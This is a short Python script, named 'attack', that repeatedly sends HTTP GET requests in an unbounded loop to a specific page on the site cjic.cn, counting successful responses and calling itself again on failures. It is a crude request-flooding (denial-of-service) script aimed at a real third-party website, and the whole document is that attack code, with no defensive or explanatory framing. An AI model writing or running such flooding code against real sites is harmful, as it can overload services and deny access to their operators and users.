import requests
count = 0
def attack():
    global count
    while True:
        res = requests.get("https://www.cjic.cn/work/37607.jhtml").status_code
        if res == 200:
            count += 1
            print(count)
        else:
            attack()

attack()